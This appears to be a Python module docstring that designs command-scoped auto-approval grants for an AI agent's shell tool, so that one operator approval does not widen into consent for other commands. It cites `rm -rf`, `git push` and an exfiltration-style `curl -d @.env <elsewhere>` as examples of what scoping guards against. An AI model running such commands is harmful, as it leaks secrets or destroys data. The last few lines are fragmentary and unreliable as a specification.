"""Conversation-scoped tool auto-approval grants over the ``approval_grants`` table.

When the operator approves a deferred tool call with the "allow for this conversation"
option, a grant is recorded here; while it is active (non-expired) the engine
auto-approves that tool's deferred calls in that conversation instead of re-prompting.
Grants are bounded by a TTL and are visible + revocable. Owner-scoped like every record.

**A grant on a command-running tool names the command.** One yes to ``shell_run_command``
is not a yes to every command a thread will ever want, and read as one it was the widest
hole in the level that gives the operator's approvals for them: a single tick under a test
run switched the per-call decision off for `rm -rf`, `git push` and everything else the
turn went on to try. So a grant on one of :data:`COMMAND_SCOPED_TOOLS` carries the leading
words the command was read as (:func:`services.permissions.command_prefixes`) and covers
only commands whose own leading words are **the same words** — `uv run pytest tests/a.py`
and `uv run pytest -k x` are the act the operator said yes to; `uv run ruff` is not. Every
other tool keeps the whole-tool grant it always had, because there is no narrower thing to
name.

**The words are matched whole, and the act has to be the one that was fenced.** Two
widenings hide inside a scope that reads as narrow, and :func:`covered_by_grant` refuses
both. A scope is only as long as the approved command's own leading words, so *begins
with* would turn one yes to a bare `env` or `uv` into a yes to everything underneath it —
hence equality. And the same leading words run under a different fence are a different
act: a redirect or an environment value pointing outside the worktree, or a wider declared
``reach``, is what decides whether ``tools/shell.py`` confines the process at all, so a
call that widens either is asked about again. Both tests are applied to what is *recorded*
as well as to what is matched, so a scope that could never cover anything is never written
down.

**One whole-tool grant on a command-running tool is still written, deliberately.** A
scheduled task's ``pre_authorized`` list (``harness/manifests/tasks.py``) seeds a grant per
tool name into the fresh conversation each unattended execution opens. There is no command
there to name — the operator wrote the tool name on the task itself, ahead of any turn —
so the empty scope is the honest record of what they authorized, and narrowing it would
leave an unattended task parked forever on the tool it was configured to use.

A grant is operator policy, not secret content, so it is stored in the clear (no vault
sealing). Expiry is enforced in Python after normalizing to UTC, so the round-trip
through SQLite (which may drop tzinfo) can't make a naive/aware comparison raise.

    A whole-tool grant covers any call to that tool. A command-scoped one covers a command
    **every** stage of which leads with exactly some granted scope's words — every stage,
    because a pipeline runs all of them and a grant on its head is not consent to its tail;

    pytest -k x` leads with. The words include the command's **flags**

    -sS <url>` from standing for `curl -d @.env <elsewhere>`: an option is part of the act,
    so an invocation flagged differently is a different scope and is asked about again.
